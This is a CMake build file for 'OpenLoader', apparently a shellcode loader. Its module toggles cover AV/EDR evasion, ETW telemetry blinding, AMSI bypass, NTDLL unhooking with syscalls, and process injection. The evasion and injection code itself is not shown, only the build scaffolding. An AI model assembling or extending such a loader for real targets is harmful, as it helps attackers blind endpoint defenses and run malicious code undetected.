# ============================================================
# CMakeLists.txt — OpenLoader Top-Level
# ============================================================
# Reads config.json to determine which modules to build.
# Python wrapper generates cmake defines from config.json.
# ============================================================

cmake_minimum_required(VERSION 3.20)
project(OpenLoader VERSION 1.0.0 LANGUAGES CXX ASM_NASM)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Shellcode-specific flags
add_compile_options(-fPIC -fPIE -Os -fvisibility=hidden)
add_compile_options(-fno-exceptions -fno-rtti)
add_compile_options(-ffunction-sections -fdata-sections)
add_link_options(-Wl,--gc-sections)

# ============================================================
# Module toggles (set by Python wrapper from config.json)
# ============================================================
option(OPENLOADER_BYPASS_STATIC  "Static AV/EDR evasion"    ON)
option(OPENLOADER_BYPASS_ETW     "ETW telemetry blinding"   ON)
option(OPENLOADER_BYPASS_AMSI    "AMSI scan bypass"         ON)
option(OPENLOADER_BYPASS_UNHOOK  "NTDLL unhooking+syscalls" ON)
option(OPENLOADER_INJECT_PROCESS "Process injection"        ON)
option(OPENLOADER_INJECT_STOMP   "Module stomping"          OFF)

# ============================================================
# Core engine
# ============================================================
add_subdirectory(cpp/core)

# ============================================================
# Bypass modules (each toggleable)
# ============================================================
if(OPENLOADER_BYPASS_STATIC)
    add_subdirectory(cpp/bypass/static)
endif()

if(OPENLOADER_BYPASS_ETW)
    add_subdirectory(cpp/bypass/etw)
endif()

if(OPENLOADER_BYPASS_AMSI)
    add_subdirectory(cpp/bypass/amsi)
endif()

if(OPENLOADER_BYPASS_UNHOOK)
    add_subdirectory(cpp/bypass/unhook)
endif()

# ============================================================
# Injection modules
# ============================================================
if(OPENLOADER_INJECT_PROCESS)
    add_subdirectory(cpp/inject)
endif()
